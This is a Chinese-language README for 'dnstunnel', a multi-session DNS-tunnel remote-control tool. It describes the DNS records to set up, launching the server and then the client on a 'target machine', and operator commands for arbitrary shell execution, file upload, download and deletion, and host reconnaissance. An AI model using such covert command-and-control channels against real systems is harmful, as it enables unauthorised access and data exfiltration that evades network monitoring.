# dnstunnel
一款多会话的二进制DNS隧道远控
# 编译
```
./build.sh
```
# 域名配置
使用者需要在域名服务做如下配置(以gandi.net为例):  
添加一条A记录: 
```
ns1 10800 IN A 55.55.55.55
```
再添加一条NS记录: 
```
1 1800 IN NS ns1.test.website.
```
# 使用说明
按照以上添加后, 在55.55.55.55上启动NDNS_server
```
./NDNS_server
```
在目标机带参数启动NDNS_client
```
./NDNS_client .1.test.website
```
# 用户界面
支持如下命令
```
session <list|clientid>
getuid
upload <local> <remote>
download <remote> <local>
bash <shell cmd>
move <src> <dst>
mkdir <dir>
rmdir <dir>
rename <old> <new>
list
rm <file>
cd <dir>
pwd
hostip
Session[29727]>>
```
## session
```
session list
```
列出当前所有会话
```
session clientid
```
切换到对应会话  
## getuid  
```
getuid
```
获取当前远程会话的用户ID  
## upload
```
upload aaa bbb
```
将本地文件aaa上传到远程会话机器bbb，限制文件aaa压缩后要小于430字节  
## download
```
download aaa bbb
```
将远程文件aaa下载到本地为bbb，下载速率大概20-30字节/秒，所以千万不要下载大文件，否则耗时超级长  
## bash
```
bash which python
```
可执行任意shell命令，注意不要执行需要交互的命令  
## move
```
move <src> <dst>
```
和mv功能一致，暂未实现，可能用处很少  
## mkdir
```
mkdir aaa
```
在远端创建文件夹aaa  
## rmdir  
删除远端文件夹  
## rename  
重命令文件  
## list
```
list
```
在远端程序当前目录执行ls -lrt并返回结果  
## rm  
删除远端文件  
##cd  
切换远端程序当前目录  
##pwd  
获取远端程序当前目录  
##hostip  
获取远端机器的出口ip和主机名
